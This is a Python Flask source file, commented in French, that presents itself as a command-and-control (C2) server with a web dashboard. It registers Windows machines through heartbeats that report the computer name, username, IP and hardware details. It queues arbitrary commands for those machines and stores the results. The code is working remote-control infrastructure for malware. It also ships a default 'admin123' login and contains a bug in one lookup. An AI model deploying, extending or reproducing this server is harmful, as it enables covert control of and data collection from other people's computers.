# -*- coding: utf-8 -*-
# server.py - Serveur C2 avec interface web intégrée

import os
import sqlite3
import json
import datetime
import hashlib
from functools import wraps
from flask import Flask, request, jsonify, render_template, session, redirect, url_for

# ========== CHARGER LE FICHIER .env ==========
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    import subprocess
    subprocess.check_call(['pip', 'install', 'python-dotenv', '--quiet'])
    from dotenv import load_dotenv
    load_dotenv()

app = Flask(__name__)

# ========== CONFIGURATION DE LA SESSION ==========
SECRET_KEY = os.environ.get('SECRET_KEY')
if not SECRET_KEY:
    env_file = os.path.join(os.path.dirname(__file__), '.env')
    if os.path.exists(env_file):
        with open(env_file, 'r') as f:
            for line in f:
                if line.startswith('SECRET_KEY='):
                    SECRET_KEY = line.split('=')[1].strip().strip('"').strip("'")
                    break
    if not SECRET_KEY:
        SECRET_KEY = hashlib.sha256(os.urandom(32)).hexdigest()
        print(f"[!] Aucune SECRET_KEY, génération automatique : {SECRET_KEY}")

app.secret_key = SECRET_KEY

DATABASE = 'c2_clients.db'

# ========== BASE DE DONNÉES ==========
def init_db():
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS clients (
        machine_id TEXT PRIMARY KEY,
        computer_name TEXT,
        username TEXT,
        windows_version TEXT,
        ip TEXT,
        last_seen TIMESTAMP,
        token TEXT,
        disk_total INTEGER,
        disk_free INTEGER,
        ram_total INTEGER,
        ram_available INTEGER,
        status TEXT DEFAULT 'active'
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        machine_id TEXT,
        command_type TEXT,
        params TEXT,
        status TEXT DEFAULT 'pending',
        created_at TIMESTAMP,
        executed_at TIMESTAMP,
        result TEXT,
        FOREIGN KEY(machine_id) REFERENCES clients(machine_id)
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS activity_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        action TEXT,
        machine_id TEXT,
        details TEXT,
        timestamp TIMESTAMP
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS admins (
        username TEXT PRIMARY KEY,
        password_hash TEXT
    )''')
    c.execute("SELECT * FROM admins")
    if not c.fetchone():
        default_hash = hashlib.sha256("admin123".encode()).hexdigest()
        c.execute("INSERT INTO admins (username, password_hash) VALUES (?, ?)", ("admin", default_hash))
    conn.commit()
    conn.close()

init_db()

def get_db():
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    return conn

def log_activity(action, machine_id=None, details=None):
    conn = get_db()
    conn.execute('INSERT INTO activity_logs (action, machine_id, details, timestamp) VALUES (?, ?, ?, ?)',
                 (action, machine_id, details, datetime.datetime.now()))
    conn.commit()
    conn.close()

# ========== AUTHENTIFICATION ==========
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

def generate_token(machine_id):
    secret = os.environ.get('SECRET_KEY', 'change_me')
    return hashlib.sha256(f"{machine_id}{secret}{datetime.datetime.now()}".encode()).hexdigest()[:32]

# ========== API CLIENT ==========
@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    data = request.get_json()
    if not data or 'machine_id' not in data:
        return jsonify({'error': 'missing machine_id'}), 400
    machine_id = data['machine_id']
    conn = get_db()
    cur = conn.execute('SELECT * FROM clients WHERE machine_id = ?', (machine_id,))
    client = cur.fetchone()
    token = generate_token(machine_id) if not client else client['token']
    conn.execute('''INSERT OR REPLACE INTO clients 
        (machine_id, computer_name, username, windows_version, ip, last_seen, token,
         disk_total, disk_free, ram_total, ram_available, status)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
        (machine_id, data.get('computer_name'), data.get('username'), data.get('windows_version'),
         data.get('ip'), datetime.datetime.now(), token,
         data.get('disk', {}).get('total'), data.get('disk', {}).get('free'),
         data.get('ram', {}).get('total'), data.get('ram', {}).get('available'), 'active'))
    conn.commit()
    conn.close()
    log_activity('heartbeat', machine_id, f"IP: {data.get('ip')}")
    return jsonify({'status': 'ok', 'token': token})

@app.route('/api/commands/<machine_id>', methods=['GET'])
def get_commands(machine_id):
    auth = request.headers.get('Authorization')
    if not auth or not auth.startswith('Bearer '):
        return jsonify({'error': 'unauthorized'}), 401
    token = auth.split(' ')[1]
    conn = get_db()
    cur = conn.execute('SELECT token FROM clients WHERE machine_id = ?', (machine_id,))
    row = cur.fetchone()
    if not row or row['token'] != token:
        conn.close()
        return jsonify({'error': 'invalid token'}), 401
    cur = conn.execute('SELECT id, command_type, params FROM commands WHERE machine_id = ? AND status = "pending" ORDER BY created_at ASC', (machine_id,))
    commands = [{'id': r['id'], 'type': r['command_type'], 'params': json.loads(r['params']) if r['params'] else {}} for r in cur.fetchall()]
    conn.close()
    return jsonify({'commands': commands})

@app.route('/api/command_result', methods=['POST'])
def command_result():
    data = request.get_json()
    if not data or 'machine_id' not in data or 'command_id' not in data:
        return jsonify({'error': 'missing fields'}), 400
    machine_id = data['machine_id']
    command_id = data['command_id']
    result = data.get('result')
    conn = get_db()
    conn.execute('UPDATE commands SET status = "executed", executed_at = ?, result = ? WHERE id = ?',
                 (datetime.datetime.now(), json.dumps(result), command_id))
    conn.commit()
    conn.close()
    log_activity('command_result', machine_id, f"Command {command_id} executed")
    return jsonify({'status': 'ok'})

# ========== API INTERFACE WEB ==========
@app.route('/api/clients')
@login_required
def api_clients():
    conn = get_db()
    cur = conn.execute('SELECT machine_id, computer_name, username, windows_version, ip, last_seen, status, disk_total, disk_free, ram_total, ram_available FROM clients ORDER BY last_seen DESC')
    clients = []
    for r in cur.fetchall():
        client = dict(r)
        if client['last_seen']:
            delta = datetime.datetime.now() - datetime.datetime.fromisoformat(client['last_seen'].replace(' ', 'T'))
            client['online'] = delta.total_seconds() < 300
        else:
            client['online'] = False
        clients.append(client)
    conn.close()
    return jsonify(clients)

@app.route('/api/client/<machine_id>')
@login_required
def api_client_detail(machine_id):
    conn = get_db()
    cur = conn.execute('SELECT * FROM clients WHERE machine_id = ?', (machine_id,))
    client = dict(cur.fetchone()) if cur.fetchone() else None
    conn.close()
    return jsonify(client)

@app.route('/api/commands/history/<machine_id>')
@login_required
def api_commands_history(machine_id):
    conn = get_db()
    cur = conn.execute('SELECT id, command_type, params, status, created_at, executed_at, result FROM commands WHERE machine_id = ? ORDER BY created_at DESC LIMIT 50', (machine_id,))
    commands = []
    for r in cur.fetchall():
        cmd = dict(r)
        try:
            cmd['params'] = json.loads(cmd['params']) if cmd['params'] else {}
            cmd['result'] = json.loads(cmd['result']) if cmd['result'] else None
        except:
            pass
        commands.append(cmd)
    conn.close()
    return jsonify(commands)

@app.route('/api/send_command', methods=['POST'])
@login_required
def api_send_command():
    data = request.get_json()
    if not data or 'machine_id' not in data or 'command_type' not in data:
        return jsonify({'error': 'missing fields'}), 400
    machine_id = data['machine_id']
    command_type = data['command_type']
    params = data.get('params', {})
    conn = get_db()
    cur = conn.execute('SELECT machine_id FROM clients WHERE machine_id = ?', (machine_id,))
    if not cur.fetchone():
        conn.close()
        return jsonify({'error': 'client not found'}), 404
    cursor = conn.execute('INSERT INTO commands (machine_id, command_type, params, created_at, status) VALUES (?, ?, ?, ?, "pending")',
                          (machine_id, command_type, json.dumps(params), datetime.datetime.now()))
    command_id = cursor.lastrowid
    conn.commit()
    conn.close()
    log_activity('send_command', machine_id, f"Commande: {command_type}")
    return jsonify({'status': 'command queued', 'command_id': command_id, 'command_type': command_type})

@app.route('/api/command_result/<int:command_id>')
@login_required
def api_command_result(command_id):
    conn = get_db()
    cur = conn.execute('SELECT result, status, command_type FROM commands WHERE id = ?', (command_id,))
    row = cur.fetchone()
    conn.close()
    if row:
        try:
            result = json.loads(row['result']) if row['result'] else None
        except:
            result = row['result']
        return jsonify({'status': row['status'], 'result': result, 'command_type': row['command_type']})
    return jsonify({'error': 'not found'}), 404

@app.route('/api/stats')
@login_required
def api_stats():
    conn = get_db()
    total_clients = conn.execute('SELECT COUNT(*) FROM clients').fetchone()[0]
    online_clients = conn.execute('SELECT COUNT(*) FROM clients WHERE last_seen > ?', (datetime.datetime.now() - datetime.timedelta(minutes=5),)).fetchone()[0]
    pending_commands = conn.execute('SELECT COUNT(*) FROM commands WHERE status = "pending"').fetchone()[0]
    executed_commands = conn.execute('SELECT COUNT(*) FROM commands WHERE status = "executed"').fetchone()[0]
    conn.close()
    return jsonify({
        'total_clients': total_clients,
        'online_clients': online_clients,
        'pending_commands': pending_commands,
        'executed_commands': executed_commands
    })

@app.route('/api/activities')
@login_required
def api_activities():
    conn = get_db()
    cur = conn.execute('SELECT action, machine_id, details, timestamp FROM activity_logs ORDER BY timestamp DESC LIMIT 50')
    activities = [dict(r) for r in cur.fetchall()]
    conn.close()
    return jsonify(activities)

# ========== PAGES WEB ==========
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        password_hash = hashlib.sha256(password.encode()).hexdigest()
        conn = get_db()
        cur = conn.execute('SELECT * FROM admins WHERE username = ? AND password_hash = ?', (username, password_hash))
        if cur.fetchone():
            session['logged_in'] = True
            session['username'] = username
            log_activity('login', None, f"Admin {username} s'est connecté")
            conn.close()
            return redirect(url_for('dashboard'))
        conn.close()
        return render_template('login.html', error='Identifiants incorrects')
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

@app.route('/')
@login_required
def dashboard():
    return render_template('index.html', username=session.get('username'))

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
